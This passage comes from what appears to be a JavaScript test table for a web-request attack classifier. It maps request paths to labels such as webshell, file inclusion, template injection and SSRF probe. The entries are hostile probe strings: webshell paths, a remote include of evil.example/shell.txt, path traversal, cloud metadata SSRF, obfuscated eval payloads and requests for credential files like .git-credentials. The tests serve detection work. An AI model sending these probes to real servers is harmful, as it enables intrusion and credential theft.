...
for (const [path, expectLabel] of [
  ...
  ["/c99.php", "webshell"],
  ["/wp-content/uploads/indoxploit.php", "webshell"],
  ["/shell.php", "webshell"],
  ["/uploads/1.jpg.php", "uploaded executable"],
  ["/wp-content/uploads/hack.php", "uploaded executable"],
  ["/images/b3ca7k.phtml", "uploaded executable"],
  ["/?q=php://filter/convert.base64-encode/resource=config.php", "file inclusion"],
  ["/?file=https://evil.example/shell.txt", "file inclusion"],
  ["/download.php?dir=../../etc", "file inclusion"],
  ["/?x={{7*7}}", "template injection"],
  ["/?x=${7*7}", "template injection"],
  ["/?x={{config}}", "template injection"],
  ["/?x=%7B%7Bself.__class__%7D%7D", "template injection"],
  ["/?url=http://169.254.169.254/latest/meta-data/", "SSRF probe"],
  ["/?target=http://localhost:8080/admin", "SSRF probe"],
  ["/?next=https://example.com/", "SSRF probe"],
  ["/?host=192.168.1.1", "SSRF probe"],
  ["/?q=zzz%a1%a2%a3%a4%25%26", "obfuscated payload"],
  ["/?p=eval(gzinflate(base64_decode(...)))", "obfuscated payload"],
  ["/phpinfo.php", "debug probe"],
  ["/?debug=1&page=2", "debug probe"],
  ["/.htpasswd", "config probe"],
  ["/.git-credentials", "config probe"],
  ["/.svn/entries", "config probe"],
  ["/cpanel", "login probe"],
  ["/webmin/", "login probe"],
